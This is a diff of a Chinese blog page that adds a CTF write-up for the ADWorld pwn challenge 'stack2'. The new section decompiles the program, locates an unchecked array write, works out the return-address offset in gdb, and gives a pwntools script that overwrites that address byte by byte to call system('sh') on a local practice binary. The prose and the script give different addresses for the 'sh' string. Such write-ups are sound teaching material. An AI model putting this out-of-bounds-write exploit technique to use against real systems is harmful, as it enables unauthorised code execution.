@@ -21,7 +21,7 @@
   <meta name="description" content="前言话说前几天18级re选手被张老师公开批斗… 嗯…从今天起每天一道题尽量抽出时间多做做题。 那么好，就从pwn的高手进阶区开始！  0x00 level3本来是一个新手区的题，但我发现这题没做，其实不难，只是记录一下在已给libc的情况下exp的规范写法 程序代码： 123456int __cdecl main(int argc, const char **argv, const char **">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ADWorld_PWN  (updating..)">
-<meta property="og:url" content="http://ld1ng.com/2020/06/03/ADWorld-pwn/index.html">
+<meta property="og:url" content="http://ld1ng.com/2020/07/24/ADWorld-pwn/index.html">
 <meta property="og:site_name" content="Ld1ng">
 <meta property="og:description" content="前言话说前几天18级re选手被张老师公开批斗… 嗯…从今天起每天一道题尽量抽出时间多做做题。 那么好，就从pwn的高手进阶区开始！  0x00 level3本来是一个新手区的题，但我发现这题没做，其实不难，只是记录一下在已给libc的情况下exp的规范写法 程序代码： 123456int __cdecl main(int argc, const char **argv, const char **">
 <meta property="og:locale" content="en_US">
@@ -40,15 +40,25 @@
 <meta property="og:image" content="https://i.loli.net/2020/06/22/3SWNQGAPxVZ1fnw.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/08/5bbac8c7057d8.png">
 <meta property="og:image" content="https://i.loli.net/2020/06/25/CX3Bue49YpyZFjw.png">
-<meta property="article:published_time" content="2020-06-02T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-06-25T04:37:49.016Z">
+<meta property="og:image" content="https://i.loli.net/2020/07/24/wunVg4fpT5iXcHz.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/24/eSPAfyF91atcjNX.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/24/9HUhwzS5eslc1Yk.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/24/ZrX7Cu63sTFWnSD.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/24/8I51s2QiOpEcl3H.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/24/LANRtUxszJPidvF.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/24/xnyg4BDKs7JFrfL.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/24/e4fIX1t56vU8pBd.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/24/kumQHUXL3fnOrE6.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/24/Pb7GBkTnCOJYjeM.png">
+<meta property="article:published_time" content="2020-07-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-07-24T15:46:26.680Z">
 <meta property="article:author" content="Ld1ng">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="ADWorld">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://i.loli.net/2020/06/02/tgAR9TQ2uZlKGI8.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://ld1ng.com/2020/06/03/ADWorld-pwn/index.html">
+  <link rel="canonical" href="http://ld1ng.com/2020/07/24/ADWorld-pwn/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Ld1ng" type="application/atom+xml">
   
@@ -260,7 +270,7 @@
   <div class="widget">
     <h3 class="widget-title">Archive</h3>
     <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">5</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">5</span></li></ul>
     </div>
   </div>
 
@@ -282,6 +292,31 @@
     <div class="widget-body">
       <ul class="recent-post-list list-unstyled ">
         
+          <li>
+            
+            <div class="item-thumb">
+              <a href="/2020/07/24/ADWorld-pwn/" class="thumb">
+    
+    
+        <span class="thumb-image thumb-none"></span>
+    
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/PWN/">PWN</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/07/24/ADWorld-pwn/" class="title">ADWorld_PWN  (updating..)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-07-23T16:00:00.000Z" itemprop="datePublished">2020-07-24</time>
+              </p>
+            </div>
+          </li>
+          
           <li>
             
             <div class="item-thumb">
@@ -382,31 +417,6 @@
             </div>
           </li>
           
-          <li>
-            
-            <div class="item-thumb">
-              <a href="/2020/06/15/Microcomputer/" class="thumb">
-    
-    
-        <span class="thumb-image thumb-none"></span>
-    
-</a>
-
-            </div>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                <a class="category-link" href="/categories/DEVELOP/">DEVELOP</a>
-              </p>
-              <p class="item-title">
-                <a href="/2020/06/15/Microcomputer/" class="title">微机实验记录</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2020-06-14T16:00:00.000Z" itemprop="datePublished">2020-06-15</time>
-              </p>
-            </div>
-          </li>
-          
       </ul>
     </div>
   </div>
@@ -422,7 +432,7 @@
   <div class="slimContent">
     <nav id="toc" class="article-toc">
       <h3 class="toc-title">Catalogue</h3>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-level3"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 level3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-pwn-100"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 pwn-100</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-dice-game"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 dice_game</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-forgot"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 forgot</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Mary-Morton"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 Mary_Morton</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-warmup"><span class="toc-number">1.6.</span> <span class="toc-text">0x05 warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-level3"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 level3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-pwn-100"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 pwn-100</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-dice-game"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 dice_game</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-forgot"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 forgot</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Mary-Morton"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 Mary_Morton</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-warmup"><span class="toc-number">1.6.</span> <span class="toc-text">0x05 warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-stack2"><span class="toc-number">1.7.</span> <span class="toc-text">0x06 stack2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-6"><span class="toc-number">1.7.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
     </nav>
   </div>
 </aside>
@@ -444,8 +454,8 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2020/06/03/ADWorld-pwn/" class="article-date">
-	  <time datetime="2020-06-02T16:00:00.000Z" itemprop="datePublished">2020-06-03</time>
+	<a href="/2020/07/24/ADWorld-pwn/" class="article-date">
+	  <time datetime="2020-07-23T16:00:00.000Z" itemprop="datePublished">2020-07-24</time>
 	</a>
 </span>
         
@@ -470,13 +480,13 @@
 	</span>
 
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/06/03/ADWorld-pwn/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/07/24/ADWorld-pwn/#comments" class="article-comment-link">Comments</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 3.4k(words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 4.5k(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 16(minutes)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 21(minutes)</span>
 	
 
       </div>
@@ -642,6 +652,47 @@
 <p><img src="https://i.loli.net/2020/06/25/CX3Bue49YpyZFjw.png" alt="image-20200625123447389"></p>
 <p>拿到flag！</p>
 <hr>
+<h2 id="0x06-stack2"><a href="#0x06-stack2" class="headerlink" title="0x06 stack2"></a>0x06 stack2</h2><p>好家伙，现在不管做什么题都能有惊天发现，说实话还是太菜了，没见过什么世面，来看看这个栈的题目吧</p>
+<p>一个计算平均数的程序，32位，canary和NX打开，拖进IDA</p>
+<p><img src="https://i.loli.net/2020/07/24/wunVg4fpT5iXcHz.png" alt="image-20200724210755608"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);           <span class="comment">//canary</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5); <span class="comment">//输入数字的数量</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);<span class="comment">//输入数字，并存放在v13数组中</span></span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);<span class="comment">//输入选择项</span></span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;   <span class="comment">//j-1为已有数字的数量</span></span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);<span class="comment">//打印现有数字表</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;<span class="comment">//本题的关键点在这，发现这里没有进行数组边界检查，存在数组越界漏洞。</span></span><br><span class="line">        			<span class="comment">//这代表着什么呢，这代表着我们可以修改数组以及数组后面的任何数据。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序浏览一遍没发现什么问题，<del>甚至感觉写的不错</del>，只是在换数字时存在一个小问题（数据越界漏洞）</p>
+<p>所以思路是：利用这个漏洞将某函数返回地址改为system函数就可以了，这里只有main函数可以利用</p>
+<p>而且IDA里还找到了system的身影，暗喜，难道真有这么简单？？？？</p>
+<p><img src="https://i.loli.net/2020/07/24/eSPAfyF91atcjNX.png" alt="image-20200724212107406"></p>
+<p>呵呵，不可能的接着看，</p>
+<p>很好找到v13数组在栈中的位置：<code>ebp-70h</code>，按照常理，返回地址应该在ebp+4h的位置，所以偏移是0x74</p>
+<p>呵呵，天真，2🐏2simple</p>
+<p>这样的exp是跑不出来的，看了看别的师傅的wp，自己用gdb调试了一下，才清楚了程序的流程</p>
+<p>正文开始：</p>
+<p>首先，要找到输入的地址，打开汇编代码，找到scanf函数，分析一下它的逻辑</p>
+<p><img src="https://i.loli.net/2020/07/24/9HUhwzS5eslc1Yk.png" alt="image-20200724213524913"></p>
+<p>然后在此处下断点，运行一下</p>
+<p><img src="https://i.loli.net/2020/07/24/ZrX7Cu63sTFWnSD.png" alt="image-20200724220036415"></p>
+<p>之前输入的’123’（0x7b）已经存放在ecx中，eax指向的地址为<code>0xffffcef8</code></p>
+<p><code>mov [eax],cl</code>之后，可以看到0x7b被赋到eax所指地址处，即<code>0xffffcef8</code>即为输入的地址</p>
+<p>再看返回地址在哪，定位到main函数最后，在retn处下断点，之前看过retn指令要做的就是pop eip</p>
+<p>也就是说此时的栈顶即为返回地址，那么就要看一下esp的地址（并非esp指向的地址）</p>
+<p><img src="https://i.loli.net/2020/07/24/8I51s2QiOpEcl3H.png" alt="image-20200724220940140"></p>
+<p>esp内的地址正是下一条指令的地址，所以如果将system函数放在这个位置，程序结束后也就会跳转去执行system函数。</p>
+<p>那么至此，就可以计算出输入的地址与返回地址的偏移量了<code>0xffffcf7c-0xffffcef8=0x84</code></p>
+<p>我以为结束了，但此时还有一个大坑，出题人这样说到：</p>
+<p><img src="https://i.loli.net/2020/07/24/LANRtUxszJPidvF.png" alt="image-20200724221437103"></p>
+<p>好吧，</p>
+<p><img src="https://i.loli.net/2020/07/24/xnyg4BDKs7JFrfL.png" alt="image-20200724221610548"></p>
+<p>直接抠出sh字符串，地址：0x08048997</p>
+<hr>
+<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">'./stack'</span>)</span><br><span class="line"></span><br><span class="line">sys_a = <span class="number">0x080485B4</span></span><br><span class="line">bin_a = <span class="number">0x08048987</span></span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expchange</span><span class="params">(addr,ass)</span>:</span></span><br><span class="line">	io.sendline(<span class="string">'3'</span>)</span><br><span class="line">	io.recvuntil(<span class="string">'change:'</span>)</span><br><span class="line">	io.sendline(str(addr))</span><br><span class="line">	io.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">	io.sendline(str(ass))</span><br><span class="line">	io.recvuntil(<span class="string">'exit'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'have:'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'numbers'</span>)</span><br><span class="line">io.sendline(<span class="string">'123'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'exit'</span>)</span><br><span class="line"></span><br><span class="line">expchange(offset,<span class="number">0xB4</span>)</span><br><span class="line">expchange(offset+<span class="number">1</span>,<span class="number">0x85</span>)</span><br><span class="line">expchange(offset+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">expchange(offset+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">offset+=<span class="number">4</span></span><br><span class="line"></span><br><span class="line">expchange(offset,<span class="number">0x87</span>)</span><br><span class="line">expchange(offset+<span class="number">1</span>,<span class="number">0x89</span>)</span><br><span class="line">expchange(offset+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">expchange(offset+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'5'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>哦对了，我比较好奇为什么这题的偏移和常规程序不一样呢，还要这么麻烦的调试</p>
+<p>后来发现了一行很奇怪的代码</p>
+<p><img src="https://i.loli.net/2020/07/24/e4fIX1t56vU8pBd.png" alt="image-20200724221959223"></p>
+<p>函数结束时，他在leave和retn之间加了一行<code>lea esp,[ecx-4]</code></p>
+<p>看不懂，老办法调试，</p>
+<p><img src="https://i.loli.net/2020/07/24/kumQHUXL3fnOrE6.png" alt="image-20200724222603212"></p>
+<p><img src="https://i.loli.net/2020/07/24/Pb7GBkTnCOJYjeM.png" alt="image-20200724222847054">好家伙，原来esp的地址在这里就莫名其妙加了0x10，但具体这步是什么作用真的没看懂，若有幸这篇博客被大佬看到，希望大佬指点一下🦄</p>
+<hr>
 
       
     </div>
@@ -651,7 +702,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://ld1ng.com/2020/06/03/ADWorld-pwn/" title="ADWorld_PWN  (updating..)">http://ld1ng.com/2020/06/03/ADWorld-pwn/</a>
+      <a href="http://ld1ng.com/2020/07/24/ADWorld-pwn/" title="ADWorld_PWN  (updating..)">http://ld1ng.com/2020/07/24/ADWorld-pwn/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -697,13 +748,9 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2020/06/14/signal/" title="2020 网鼎杯_signal"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2020/06/03/ADWorld-RE/" title="ADWorld_RE  (updating..)"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2020/07/23/Heap/" title="堆溢出漏洞利用总结"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
